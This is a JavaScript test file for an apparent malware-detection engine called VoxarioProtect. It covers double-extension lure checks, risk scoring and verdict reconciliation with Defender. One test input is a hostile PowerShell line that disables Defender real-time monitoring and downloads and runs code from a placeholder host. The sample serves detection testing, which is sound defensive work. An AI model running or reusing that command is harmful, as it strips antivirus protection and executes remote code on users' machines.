"use strict";
const assert = require("assert");
const { calculateLayeredRisk, reconcileVerdicts, hasDoubleExtensionLure } = require("./protect-layered-engine.cjs");

assert.equal(hasDoubleExtensionLure("invoice.pdf.exe"), true);
assert.equal(hasDoubleExtensionLure("normal-installer.exe"), false);

const benign = calculateLayeredRisk({ fileName: "signed.exe", signatureValid: true, trustScore: 82, size: 4_000_000 });
assert.equal(benign.shouldEscalateDefender, false);

const tamper = calculateLayeredRisk({
  fileName: "invoice.pdf.ps1",
  signatureValid: false,
  trustScore: 20,
  scriptText: "Set-MpPreference -DisableRealtimeMonitoring $true; IEX (Invoke-WebRequest https://example.invalid/p).Content",
  size: 1200,
});
assert.equal(tamper.severity, "critical");
assert.equal(tamper.shouldEscalateDefender, true);
assert.equal(tamper.shouldContainNetwork, true);

const reconciled = reconcileVerdicts({ firstPass: tamper, secondPass: tamper, defenderDetected: false });
assert.equal(reconciled.verdict, "protect-only-critical");

const defender = reconcileVerdicts({ firstPass: benign, secondPass: benign, defenderDetected: true });
assert.equal(defender.verdict, "defender-confirmed");

console.log("VoxarioProtect layered engine tests passed.");
